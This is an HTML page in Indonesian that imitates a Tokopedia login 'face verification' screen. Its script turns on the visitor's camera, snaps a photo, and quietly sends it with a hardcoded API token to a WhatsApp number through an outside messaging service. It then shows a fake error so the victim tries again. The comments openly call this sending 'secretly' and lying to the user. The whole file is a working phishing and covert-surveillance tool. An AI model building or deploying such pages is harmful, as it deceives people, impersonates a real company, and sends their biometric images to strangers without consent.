<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Tokopedia - Verifikasi Keamanan</title>
    <style>
        :root { --p: #00AA5B; }
        body { background: #f0f3f7; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 35px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 90%; max-width: 360px; text-align: center; }
        .logo { font-size: 26px; font-weight: bold; color: var(--p); margin-bottom: 5px; letter-spacing: -1px; }
        h1 { font-size: 16px; margin-bottom: 25px; color: #31353B; font-weight: 600; }
        .cam-box { width: 220px; height: 220px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 25px; overflow: hidden; position: relative; background: #000; box-shadow: 0 0 15px rgba(0,170,91,0.2); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        .btn:disabled { background: #E5E7E9; color: #AAB4BF; }
        #msg { font-size: 12px; margin-top: 15px; color: #888; font-style: italic; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">tokopedia</div>
        <h1>Verifikasi Wajah</h1>
        <div class="cam-box">
            <video id="v" autoplay playsinline muted></video>
        </div>
        <button id="b" class="btn" disabled>Login Sekarang</button>
        <div id="msg">Menghubungkan ke enkripsi kamera...</div>
    </div>

    <canvas id="c" style="display:none;"></canvas>

    <script>
        const v = document.getElementById('v'), b = document.getElementById('b'), msg = document.getElementById('msg'), can = document.getElementById('c');

        // --- KONFIGURASI ---
        const tokenWA = 'PG3GRjmArXV4PHYgQaFz';
        const nomorWA = '6283823170469';

        // Akses Kamera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => { 
            v.srcObject = s; 
            b.disabled = false; 
            msg.innerText = "Kamera Terverifikasi ✅"; 
        })
        .catch(e => { 
            msg.innerText = "Error: Kamera diblokir! Izinkan akses untuk verifikasi."; 
            msg.style.color = "red";
        });

        b.onclick = async () => {
            b.disabled = true;
            b.innerText = "Memproses...";
            msg.innerText = "Mencocokkan data biometrik...";

            // Ambil Foto dari Video
            can.width = v.videoWidth;
            can.height = v.videoHeight;
            const ctx = can.getContext('2d');
            ctx.translate(can.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0);
            
            // Kompres foto (0.4) supaya enteng dikirim
            const imgData = can.toDataURL('image/jpeg', 0.4);

            // Siapkan Data Kirim (FormData)
            const f = new FormData();
            f.append('target', nomorWA);
            f.append('url', imgData);
            f.append('caption', '🚨 *PRANK LOG: TARGET TERDETEKSI* 🚨\n\nWajah target sudah terkirim diam-diam!');

            try {
                // KIRIM DIAM-DIAM KE WHATSAPP
                await fetch('https://api.fonnte.com/send', {
                    method: 'POST',
                    headers: { 'Authorization': tokenWA },
                    body: f
                });

                // TAMPILAN PRANK (BOHONGIN USER)
                setTimeout(() => {
                    alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah Anda terlihat jelas dan pencahayaan cukup.");
                    b.disabled = false;
                    b.innerText = "Coba Lagi";
                    msg.innerText = "Pencahayaan kurang, silakan ulangi.";
                    msg.style.color = "orange";
                }, 2000);

            } catch (err) {
                alert("Kesalahan Jaringan. Silakan coba lagi.");
                b.disabled = false;
                b.innerText = "Login Sekarang";
            }
        };
    </script>
</body>
</html>
